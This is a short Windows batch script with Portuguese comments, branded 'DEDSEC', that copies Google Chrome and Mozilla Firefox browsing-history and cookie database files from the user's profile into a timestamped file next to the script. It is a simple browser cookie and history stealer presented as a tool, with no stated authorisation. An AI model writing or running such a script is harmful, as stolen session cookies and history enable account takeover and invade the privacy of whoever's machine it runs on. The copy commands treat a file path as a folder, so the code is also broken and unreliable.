@echo off
title [DEDSEC] Extração de Informações de Navegadores
color 0a
echo [DEDSEC] Extraindo histórico e cookies dos navegadores...
setlocal

REM Definir o caminho da pasta atual (onde o arquivo .bat está)
set local_folder=%~dp0

REM Gerar a data e hora atual para um nome de arquivo único
set data=%date:~-4,4%-%date:~-7,2%
set hora=%time:~0,2%-%time:~3,2%-%time:~6,2%
set hora=%hora: =0%

REM Definir o arquivo de log para salvar as informações
set logFile=%local_folder%browser_info_log_%data%_%hora%.txt

REM Extração do histórico do Chrome
echo ============================== >> %logFile%
echo Histórico de Navegação - Google Chrome >> %logFile%
echo ============================== >> %logFile%
copy "%LocalAppData%\Google\Chrome\User Data\Default\History" "%logFile%\chrome_history.txt"

REM Extração dos cookies do Chrome
echo ============================== >> %logFile%
echo Cookies - Google Chrome >> %logFile%
echo ============================== >> %logFile%
copy "%LocalAppData%\Google\Chrome\User Data\Default\Cookies" "%logFile%\chrome_cookies.txt"

REM Extração do histórico do Firefox
echo ============================== >> %logFile%
echo Histórico de Navegação - Mozilla Firefox >> %logFile%
echo ============================== >> %logFile%
copy "%AppData%\Mozilla\Firefox\Profiles\*\places.sqlite" "%logFile%\firefox_history.sqlite"

REM Extração dos cookies do Firefox
echo ============================== >> %logFile%
echo Cookies - Mozilla Firefox >> %logFile%
echo ============================== >> %logFile%
copy "%AppData%\Mozilla\Firefox\Profiles\*\cookies.sqlite" "%logFile%\firefox_cookies.sqlite"

echo [DEDSEC] Extração concluída. Informações salvas em %logFile%.
pause
exit
